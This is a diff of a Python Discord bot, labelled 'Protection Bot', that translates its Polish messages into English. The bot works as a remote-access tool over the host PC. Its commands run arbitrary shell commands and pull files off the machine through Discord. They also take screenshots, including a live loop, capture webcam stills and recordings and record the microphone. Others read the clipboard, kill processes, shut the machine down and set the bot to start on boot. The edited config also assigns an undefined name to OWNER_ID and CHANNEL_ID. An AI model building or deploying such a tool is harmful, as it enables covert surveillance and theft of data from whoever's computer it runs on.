@@ -16,13 +16,12 @@ import sounddevice as sd
 import numpy as np
 import pygame
 
-# ==================== KONFIGURACJA ====================
-TOKEN = "twój_token" # ← wklej NOWY token po resecie
-OWNER_ID=twój_id                     
-OWNER_ID =twój_id
-CHANNEL_ID =channel_id
+# ==================== CONFIGURATION ====================
+TOKEN = "your_token_here"              # Paste your bot token after reset
+OWNER_ID = your_token_here                           # Your Discord user ID
+CHANNEL_ID = your_token_here                         # Notification channel ID
 UPLOAD_FOLDER = Path(r"C:\Desktop")
-# ======================================================
+# =======================================================
 
 UPLOAD_FOLDER.mkdir(parents=True, exist_ok=True)
 
@@ -61,13 +60,13 @@ def press_key(vk):
 
 @bot.event
 async def on_ready():
-    print(f"[+] Zalogowano jako {bot.user}")
+    print(f"[+] Logged in as {bot.user}")
     channel = bot.get_channel(CHANNEL_ID)
     if channel:
         try:
             embed = discord.Embed(
-                title="✅ Bot Ochrona uruchomiony",
-                description=f"**Komputer:** `{os.environ.get('COMPUTERNAME', '?')}`\n**Czas:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
+                title="✅ Protection Bot started",
+                description=f"**Computer:** `{os.environ.get('COMPUTERNAME', '?')}`\n**Time:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`",
                 color=0x00ff88
             )
             await channel.send(embed=embed)
@@ -77,7 +76,7 @@ async def on_ready():
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
-        await ctx.send("❌ Brak uprawnień.")
+        await ctx.send("❌ No permission.")
     elif isinstance(error, commands.CommandNotFound):
         pass
     else:
@@ -93,16 +92,16 @@ async def send_long(ctx, text, filename="output.txt"):
 @is_owner()
 async def help_cmd(ctx):
     embed = discord.Embed(
-        title="🛡️ Ochrona Bot – Lista komend",
-        description="Wszystkie komendy działają **tylko dla Ciebie**.",
+        title="🛡️ Protection Bot – Command list",
+        description="All commands work **only for you**.",
         color=0x5865F2
     )
-    embed.add_field(name="📌 Podstawowe", value="`.help` `.status` `.switch` `.switch 0/1`", inline=False)
+    embed.add_field(name="📌 Basic", value="`.help` `.status` `.switch` `.switch 0/1`", inline=False)
     embed.add_field(name="💻 System", value="`.cmd` `.ls` `.download` `.upload` `.procs` `.windows` `.kill` `.clipboard`", inline=False)
-    embed.add_field(name="👁️ Podgląd", value="`.ss` `.sslive on/off` `.webcam` `.camrec` `.mic` `.choosemic`", inline=False)
-    embed.add_field(name="🔊 Dźwięk", value="`.soundplay` `.soundstop` `.volume` `.volup` `.voldown` `.mute`", inline=False)
-    embed.add_field(name="⚡ Zasilanie", value="`.lock` `.shutdown` `.restart` `.battery`", inline=False)
-    embed.add_field(name="🌐 Inne", value="`.open` `.notify` `.join` `.leave` `.autoon` `.autooff` `.autostatus` `.destroy`", inline=False)
+    embed.add_field(name="👁️ Monitoring", value="`.ss` `.sslive on/off` `.webcam` `.camrec` `.mic` `.choosemic`", inline=False)
+    embed.add_field(name="🔊 Audio", value="`.soundplay` `.soundstop` `.volume` `.volup` `.voldown` `.mute`", inline=False)
+    embed.add_field(name="⚡ Power", value="`.lock` `.shutdown` `.restart` `.battery`", inline=False)
+    embed.add_field(name="🌐 Other", value="`.open` `.notify` `.join` `.leave` `.autoon` `.autooff` `.autostatus` `.destroy`", inline=False)
     await ctx.send(embed=embed)
 
 @bot.command(name="status")
@@ -114,12 +113,12 @@ async def status(ctx):
         cpu = psutil.cpu_percent(interval=0.5)
         mem = psutil.virtual_memory()
         disk = psutil.disk_usage("C:\\")
-        embed = discord.Embed(title="📊 Status", color=0x00ff88)
+        embed = discord.Embed(title="📊 System status", color=0x00ff88)
         embed.add_field(name="Host", value=f"`{os.environ.get('COMPUTERNAME')}`", inline=True)
         embed.add_field(name="CPU", value=f"**{cpu}%**", inline=True)
         embed.add_field(name="RAM", value=f"**{mem.percent}%**", inline=True)
-        embed.add_field(name="Dysk", value=f"**{disk.percent}%**", inline=True)
-        embed.add_field(name="Start", value=f"`{boot}`", inline=True)
+        embed.add_field(name="Disk", value=f"**{disk.percent}%**", inline=True)
+        embed.add_field(name="Booted", value=f"`{boot}`", inline=True)
         await ctx.send(embed=embed)
     except Exception as e:
         await ctx.send(f"❌ {e}")
@@ -136,20 +135,24 @@ async def switch_monitors(ctx, monitor_id: int = None):
     if monitor_id is None:
         if not mons:
             size = pyautogui.size()
-            await ctx.send(f"`0` → **Główny** {size[0]}x{size[1]}")
+            await ctx.send(f"`0` → **Primary** {size[0]}x{size[1]}")
             return
-        lines = [f"`{i}` → {m.width}x{m.height}{' (główny)' if m.is_primary else ''}" for i, m in enumerate(mons)]
-        await ctx.send(embed=discord.Embed(title="🖥️ Monitory", description="\n".join(lines) + f"\n\nWybrany: **{selected_monitor}**", color=0x5865F2))
+        lines = [f"`{i}` → {m.width}x{m.height}{' (primary)' if m.is_primary else ''}" for i, m in enumerate(mons)]
+        await ctx.send(embed=discord.Embed(
+            title="🖥️ Monitors",
+            description="\n".join(lines) + f"\n\nSelected: **{selected_monitor}**",
+            color=0x5865F2
+        ))
         return
     if not mons:
         if monitor_id == 0:
             selected_monitor = 0
             await ctx.send("✅ Monitor **0**")
         else:
-            await ctx.send("❌ Tylko monitor `0`")
+            await ctx.send("❌ Only monitor `0` available")
         return
     if monitor_id < 0 or monitor_id >= len(mons):
-        await ctx.send(f"❌ Zły numer. 0–{len(mons)-1}")
+        await ctx.send(f"❌ Invalid number. Available: 0–{len(mons)-1}")
         return
     selected_monitor = monitor_id
     await ctx.send(f"✅ Monitor **{monitor_id}**")
@@ -159,11 +162,13 @@ async def switch_monitors(ctx, monitor_id: int = None):
 async def run_command(ctx, *, command: str):
     await ctx.send(f"⏳ `{command}`")
     try:
-        proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        proc = await asyncio.create_subprocess_shell(
+            command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+        )
         stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
         out = (stdout or b"").decode("utf-8", errors="replace")
         err = (stderr or b"").decode("utf-8", errors="replace")
-        await send_long(ctx, f"Kod: {proc.returncode}\n{out}\n{err}")
+        await send_long(ctx, f"Exit code: {proc.returncode}\n{out}\n{err}")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -177,7 +182,7 @@ async def list_dir(ctx, *, path: str = "."):
             p = Path.cwd() / p
         p = p.resolve()
         if not p.exists():
-            await ctx.send(f"❌ Nie istnieje:\n`{p}`")
+            await ctx.send(f"❌ Does not exist:\n`{p}`")
             return
         if p.is_file():
             await ctx.send(f"📄 `{p.name}` ({p.stat().st_size/1024:.1f} KB)\n`{p}`")
@@ -202,20 +207,20 @@ async def download_file(ctx, *, path: str):
         if not p.is_absolute():
             p = Path.cwd() / p
         if not p.exists():
-            await ctx.send(f"❌ Nie znaleziono:\n`{p}`\nUżyj `.ls` żeby sprawdzić ścieżkę.")
+            await ctx.send(f"❌ Not found:\n`{p}`\nUse `.ls` to check the path.")
             return
         p = p.resolve()
         if not p.is_file():
-            await ctx.send(f"❌ To folder, nie plik:\n`{p}`")
+            await ctx.send(f"❌ This is a folder, not a file:\n`{p}`")
             return
         size = p.stat().st_size
         if size > 24 * 1024 * 1024:
-            await ctx.send(f"❌ Za duży: **{size/1024/1024:.1f} MB** (limit ~24 MB)")
+            await ctx.send(f"❌ Too large: **{size/1024/1024:.1f} MB** (limit ~24 MB)")
             return
         await ctx.send(f"⬇️ `{p.name}` ({size/1024:.1f} KB)…")
         await ctx.send(file=discord.File(str(p), filename=p.name))
     except PermissionError:
-        await ctx.send("❌ Brak uprawnień.")
+        await ctx.send("❌ Permission denied.")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -223,7 +228,7 @@ async def download_file(ctx, *, path: str):
 @is_owner()
 async def upload_file(ctx):
     if not ctx.message.attachments:
-        await ctx.send("Dołącz plik")
+        await ctx.send("Attach a file.")
         return
     for att in ctx.message.attachments:
         dest = UPLOAD_FOLDER / att.filename
@@ -241,7 +246,7 @@ async def processes(ctx):
             reverse=True
         )[:12]
         lines = [f"`{pid}` **{name}** — {mem} MB" for mem, pid, name in procs]
-        await ctx.send(embed=discord.Embed(title="📋 Procesy", description="\n".join(lines), color=0xffaa00))
+        await ctx.send(embed=discord.Embed(title="📋 Processes", description="\n".join(lines), color=0xffaa00))
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -251,7 +256,11 @@ async def open_windows(ctx):
     try:
         import pygetwindow as gw
         wins = [w for w in gw.getAllTitles() if w.strip()][:20]
-        await ctx.send(embed=discord.Embed(title="🪟 Okna", description="\n".join(f"• `{w[:45]}`" for w in wins) or "Brak", color=0x5865F2))
+        await ctx.send(embed=discord.Embed(
+            title="🪟 Windows",
+            description="\n".join(f"• `{w[:45]}`" for w in wins) or "None",
+            color=0x5865F2
+        ))
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -265,7 +274,7 @@ async def kill_process(ctx, *, name: str):
             if name.lower() in (p.info["name"] or "").lower():
                 p.kill()
                 killed += 1
-        await ctx.send(f"☠️ Zabito **{killed}** × `{name}`" if killed else f"Nie znaleziono `{name}`")
+        await ctx.send(f"☠️ Killed **{killed}** × `{name}`" if killed else f"Not found: `{name}`")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -275,7 +284,7 @@ async def clipboard(ctx):
     try:
         import pyperclip
         text = pyperclip.paste()
-        await ctx.send(f"📋 ```\n{(text or 'pusty')[:1400]}\n```")
+        await ctx.send(f"📋 ```\n{(text or 'empty')[:1400]}\n```")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -308,9 +317,9 @@ async def sslive(ctx, mode: str = "status"):
     mode = mode.lower()
     if mode == "on":
         if sslive_task and not sslive_task.done():
-            await ctx.send("Już działa")
+            await ctx.send("Already running")
             return
-        await ctx.send("✅ Ciągłe zrzuty włączone")
+        await ctx.send("✅ Live screenshots enabled")
         async def loop():
             while True:
                 try:
@@ -336,9 +345,9 @@ async def sslive(ctx, mode: str = "status"):
         if sslive_task and not sslive_task.done():
             sslive_task.cancel()
             sslive_task = None
-            await ctx.send("⏹️ Stop")
+            await ctx.send("⏹️ Stopped")
         else:
-            await ctx.send("Nie było włączone")
+            await ctx.send("Was not running")
     else:
         st = "🟢 ON" if (sslive_task and not sslive_task.done()) else "🔴 OFF"
         await ctx.send(f"Status: {st}")
@@ -352,7 +361,7 @@ async def webcam(ctx):
         ret, frame = cap.read()
         cap.release()
         if not ret:
-            await ctx.send("❌ Brak obrazu")
+            await ctx.send("❌ No image")
             return
         frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
         img = Image.fromarray(frame)
@@ -371,20 +380,24 @@ async def choose_mic(ctx, device_id: int = None):
         devices = sd.query_devices()
         input_devices = [(i, d["name"]) for i, d in enumerate(devices) if d["max_input_channels"] > 0]
         if not input_devices:
-            await ctx.send("❌ Brak mikrofonów")
+            await ctx.send("❌ No microphones found")
             return
         if device_id is None:
             lines = [f"`{i}` → **{name}**" for i, name in input_devices]
-            current = f"\n\nWybrany: **{selected_mic}**" if selected_mic is not None else "\n\nWybrany: domyślny"
-            await ctx.send(embed=discord.Embed(title="🎙️ Mikrofony", description="\n".join(lines) + current + "\n\n`.choosemic numer`", color=0x5865F2))
+            current = f"\n\nSelected: **{selected_mic}**" if selected_mic is not None else "\n\nSelected: default"
+            await ctx.send(embed=discord.Embed(
+                title="🎙️ Microphones",
+                description="\n".join(lines) + current + "\n\n`.choosemic number`",
+                color=0x5865F2
+            ))
             return
         valid = [i for i, _ in input_devices]
         if device_id not in valid:
-            await ctx.send(f"❌ Zły numer: {valid}")
+            await ctx.send(f"❌ Invalid number: {valid}")
             return
         selected_mic = device_id
         name = next(n for i, n in input_devices if i == device_id)
-        await ctx.send(f"✅ Mikrofon **{device_id}**: `{name}`")
+        await ctx.send(f"✅ Microphone **{device_id}**: `{name}`")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -396,7 +409,7 @@ async def camera_record(ctx, seconds: float = 5.0):
     try:
         cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
         if not cap.isOpened():
-            await ctx.send("❌ Brak kamerki")
+            await ctx.send("❌ Camera not available")
             return
         w, h = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
         fps = 15
@@ -411,7 +424,7 @@ async def camera_record(ctx, seconds: float = 5.0):
         cap.release()
         out.release()
         if temp_path.stat().st_size > 24 * 1024 * 1024:
-            await ctx.send("❌ Za duży")
+            await ctx.send("❌ File too large")
             temp_path.unlink(missing_ok=True)
             return
         await ctx.send(file=discord.File(str(temp_path), filename="camrec.avi"))
@@ -446,11 +459,11 @@ async def mic_record(ctx, seconds: float = 5.0):
 @is_owner()
 async def soundplay(ctx, volume: float = 0.7):
     if not ctx.message.attachments:
-        await ctx.send("❌ Dołącz MP3/WAV")
+        await ctx.send("❌ Attach an MP3/WAV file")
         return
     att = ctx.message.attachments[0]
     if not att.filename.lower().endswith((".mp3", ".wav", ".ogg")):
-        await ctx.send("❌ Tylko mp3/wav/ogg")
+        await ctx.send("❌ Only mp3/wav/ogg")
         return
     volume = max(0.0, min(1.0, volume))
     try:
@@ -467,7 +480,7 @@ async def soundplay(ctx, volume: float = 0.7):
         await ctx.send(f"🔊 `{att.filename}` ({int(volume*100)}%)")
     except Exception as e:
         if "corrupt" in str(e).lower() or "bad stream" in str(e).lower():
-            await ctx.send("❌ Zły MP3 – spróbuj WAV")
+            await ctx.send("❌ Bad MP3 – try WAV")
         else:
             await ctx.send(f"❌ {e}")
 
@@ -476,17 +489,16 @@ async def soundplay(ctx, volume: float = 0.7):
 async def soundstop(ctx):
     try:
         pygame.mixer.music.stop()
-        await ctx.send("⏹️ Stop")
+        await ctx.send("⏹️ Stopped")
     except:
-        await ctx.send("Nic nie gra")
+        await ctx.send("Nothing is playing")
 
-# Dźwięk systemowy – działa w .exe (bez pycaw)
 @bot.command(name="mute")
 @is_owner()
 async def mute(ctx):
     try:
         press_key(0xAD)  # VK_VOLUME_MUTE
-        await ctx.send("🔇 Mute przełączony")
+        await ctx.send("🔇 Mute toggled")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -495,7 +507,7 @@ async def mute(ctx):
 async def unmute(ctx):
     try:
         press_key(0xAD)
-        await ctx.send("🔊 Mute przełączony")
+        await ctx.send("🔊 Mute toggled")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -508,10 +520,10 @@ async def set_volume(ctx, level: int = None):
             return
         level = max(0, min(100, level))
         for _ in range(50):
-            press_key(0xAE)  # down
+            press_key(0xAE)  # volume down
         for _ in range(int(level / 2)):
-            press_key(0xAF)  # up
-        await ctx.send(f"🔊 ok. **{level}%**")
+            press_key(0xAF)  # volume up
+        await ctx.send(f"🔊 approx. **{level}%**")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -537,20 +549,20 @@ async def lock_pc(ctx):
     try:
         import ctypes
         ctypes.windll.user32.LockWorkStation()
-        await ctx.send("🔒")
+        await ctx.send("🔒 Locked")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
 @bot.command(name="shutdown")
 @is_owner()
 async def shutdown_pc(ctx):
-    await ctx.send("⚠️ Wyłączenie za 10s")
+    await ctx.send("⚠️ Shutting down in 10s")
     os.system("shutdown /s /t 10")
 
 @bot.command(name="restart")
 @is_owner()
 async def restart_pc(ctx):
-    await ctx.send("⚠️ Restart za 10s")
+    await ctx.send("⚠️ Restarting in 10s")
     os.system("shutdown /r /t 10")
 
 @bot.command(name="battery")
@@ -560,7 +572,7 @@ async def battery(ctx):
         import psutil
         bat = psutil.sensors_battery()
         if not bat:
-            await ctx.send("Brak baterii")
+            await ctx.send("No battery")
             return
         st = "🔌" if bat.power_plugged else "🔋"
         await ctx.send(f"{st} **{bat.percent}%**")
@@ -584,7 +596,7 @@ async def open_url(ctx, url: str):
 async def notify(ctx, *, text: str):
     try:
         from win10toast import ToastNotifier
-        ToastNotifier().show_toast("Ochrona", text, duration=5, threaded=True)
+        ToastNotifier().show_toast("Protection Bot", text, duration=5, threaded=True)
         await ctx.send(f"🔔 `{text}`")
     except Exception as e:
         await ctx.send(f"❌ {e}")
@@ -594,15 +606,15 @@ async def notify(ctx, *, text: str):
 async def join_voice(ctx, *, channel_name: str = None):
     channels = ctx.guild.voice_channels
     if not channels:
-        await ctx.send("Brak kanałów")
+        await ctx.send("No voice channels")
         return
     if channel_name is None:
         lista = "\n".join(f"`{i+1}.` **{c.name}**" for i, c in enumerate(channels))
-        await ctx.send(f"**Kanały:**\n{lista}")
+        await ctx.send(f"**Channels:**\n{lista}")
         return
     ch = discord.utils.find(lambda c: c.name.lower() == channel_name.lower(), channels)
     if not ch:
-        await ctx.send("❌ Nie znaleziono")
+        await ctx.send("❌ Not found")
         return
     try:
         if ctx.voice_client:
@@ -618,14 +630,14 @@ async def join_voice(ctx, *, channel_name: str = None):
 async def leave_voice(ctx):
     if ctx.voice_client:
         await ctx.voice_client.disconnect()
-        await ctx.send("👋")
+        await ctx.send("👋 Left")
     else:
-        await ctx.send("Nie jestem na kanale")
+        await ctx.send("Not in a voice channel")
 
 @bot.command(name="micon")
 @is_owner()
 async def micon(ctx):
-    await ctx.send("Używaj `.mic 5`")
+    await ctx.send("Use `.mic 5`")
 
 @bot.command(name="micoff")
 @is_owner()
@@ -647,7 +659,7 @@ async def auto_on(ctx):
                 pythonw = Path(sys.executable)
             content = f'@echo off\nstart "" "{pythonw}" "{script}"\n'
         bat_path.write_text(content, encoding="utf-8")
-        await ctx.send(f"✅ Auto-start **włączony**\n`{bat_path}`")
+        await ctx.send(f"✅ Autostart **enabled**\n`{bat_path}`")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
@@ -662,25 +674,25 @@ async def auto_off(ctx):
             if p.exists():
                 p.unlink()
                 removed = True
-        await ctx.send("✅ Auto-start **wyłączony**" if removed else "Nie był włączony.")
+        await ctx.send("✅ Autostart **disabled**" if removed else "Was not enabled.")
     except Exception as e:
         await ctx.send(f"❌ {e}")
 
 @bot.command(name="autostatus")
 @is_owner()
 async def auto_status(ctx):
-    await ctx.send("🟢 **WŁĄCZONY**" if is_autostart_enabled() else "🔴 **WYŁĄCZONY**")
+    await ctx.send("🟢 **ENABLED**" if is_autostart_enabled() else "🔴 **DISABLED**")
 
 @bot.command(name="destroy")
 @is_owner()
 async def destroy(ctx):
-    await ctx.send("💥 Wyłączam…")
+    await ctx.send("💥 Shutting down…")
     await bot.close()
     os._exit(0)
 
 if __name__ == "__main__":
-    if not TOKEN or OWNER_ID == 0:
-        print("Uzupełnij TOKEN i OWNER_ID!")
+    if not TOKEN or TOKEN == "your_token_here" or OWNER_ID == 0:
+        print("Fill in TOKEN and OWNER_ID!")
         sys.exit(1)
-    print("[*] Start...")
+    print("[*] Starting...")
     bot.run(TOKEN)
